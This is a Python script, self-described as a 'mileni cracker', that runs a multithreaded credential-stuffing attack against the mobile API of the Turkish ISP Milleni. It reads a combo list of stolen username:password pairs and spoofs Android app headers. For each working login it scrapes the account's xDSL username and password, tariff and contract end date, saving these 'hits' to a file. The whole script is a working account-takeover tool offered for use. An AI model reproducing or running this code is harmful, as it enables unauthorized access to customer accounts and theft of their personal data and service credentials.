import requests
import threading
import time

headers2={"operationSystemType": "Android" ,
"operationSystemVersion": "10" ,
"millenicomMobileAppVersion": "1.9.3" ,
"Content-Type": "application/x-www-form-urlencoded" ,
"Content-Length": "127" ,
"Host": "api.milleni.com.tr" ,
"Connection": "Keep-Alive" ,
"Accept-Encoding": "gzip" ,
"User-Agent": "okhttp/4.2.1"}



def combo():
	print('''
.d88b.                                       
8P  Y8 8d8b. .d88b .d8b .d88 8d8b.d8b. .d88b 
8b  d8 8P Y8 8.dP' 8    8  8 8P Y8P Y8 8.dP' 
`Y88P' 8   8 `Y88P `Y8P `Y88 8   8   8 `Y88P 
𝙎𝙞𝙗𝙚𝙧𝙙𝙚𝙮𝙞𝙯.𝙘𝙤𝙢
mileni cracker  ''')
	
	combos = open(input('combo ekleyin... ör[c:masaustu/combo.txt]'+'\n'+'combo='), encoding='utf8', errors = 'ignore').readlines()
	User = []
	Pass = []
	for y in combos:
	    ez = y.replace("\n", "").split(":")
	    try:
	        User.append(ez[0])
	        Pass.append(ez[1])
	    except:
	        pass
	return User,Pass     

User,Pass=combo()
print('combo size=',len(User))




def crack(User1,Pass1):
	r=requests.post('https://api.milleni.com.tr/token',data={'grant_type':'password','username':User1,'password':Pass1,'segment':'individual','kvkk_information':'true','kvkk_explicit_consent':'true'},headers=headers2)
	#print(r.text)
	#print('____')
	if 'error_description' in r.text:
		print('___Fail___')
		#print(User1)
	elif 'access_token':
		print('▁ ▂ ▄ ▅ ▆ ▇ █ ---ℌℑ𝔗--- █ ▇ ▆ ▅ ▄ ▂ ▁')
		#print(r.text)
		a1=r.text.split('access_token":"')[1]
		auth=a1.split('","token_t')[0]
		#print(auth)
		headers1= {"Authorization": "bearer "+auth ,
	"operationSystemType": "Android" ,
	"operationSystemVersion": "10" ,
	"millenicomMobileAppVersion": "1.9.3" ,
	"Host": "api.milleni.com.tr" ,
	"Connection": "Keep-Alive" ,
	"Accept-Encoding": "gzip" ,
	"User-Agent": "okhttp/4.2.1"}
		r2=requests.get('https://api.milleni.com.tr/Account/GetAccountList',headers=headers1)
		#print(r2.text)
		a2=r2.text.split('ntNumber":')[1]
		number=a2.split(',"account')[0]
		a3=r2.text.split('countName":"')[1]
		ad=a3.split('","canBuyAd')[0]
		r3=requests.get('https://api.milleni.com.tr/Account/GetSummary?accountId='+number,headers=headers1)
		#print(r3.text)
		a4=r3.text.split('xdslPassword":"')[1]
		pas=a4.split('","xdslUserName":')[0]
		a5=r3.text.split('"xdslUserName":"')[1]
		user=a5.split('","canBuyAdditi')[0]
		a6=r3.text.split('"tariff":"')[1]
		paket=a6.split('","productTypeDec')[0]
		a7=r3.text.split('"contractCommitmentEndDate":"')[1]
		bitis=a7.split('T')[0]
		hits='\n'+'____by onecame____'+'\n'+'Tc/tel:pass='+User1+':'+Pass1+'\n'+'Kampanya='+paket+'\n'+'Bitiş tarihi = '+bitis+'\n'+'User='+user+'   ---   '+'Pass='+pas+'\n'
		dosya = open("output.txt","a", encoding="utf-8")
		dosya.write(hits)
		dosya.close()			
		





num=int('0')
print('''
.d88b.                                       
8P  Y8 8d8b. .d88b .d8b .d88 8d8b.d8b. .d88b 
8b  d8 8P Y8 8.dP' 8    8  8 8P Y8P Y8 8.dP' 
`Y88P' 8   8 `Y88P `Y8P `Y88 8   8   8 `Y88P 
                                            ''')

threadsnum = input("Threads :")
while 1:
    if threading.active_count() < int(threadsnum):
            if len(User) > num:
 #                   randomproxy = proxys3[random.randint(1,len(proxys3))]
 #                   proxsel = {
 #                       'http': 'http://'+randomproxy,
 #                       'https': 'https://'+randomproxy
 #                       }
                threading.Thread(target=crack, args=(User[num], Pass[num])).start()
                num += 1
                #print('Taranmamış user sayısı=',kalan)
                #kalan -= 1
            else:
            	print('°°°·.°·..·°¯°·._.· 𝔹𝕚𝕥𝕥𝕚 𝕔𝕒𝕟𝕚𝕞 ·._.·°¯°·.·° .·°°°')
            	
            	time.sleep(0.6)
    else:
        print("Checking done!")
        time.sleep(0.3)
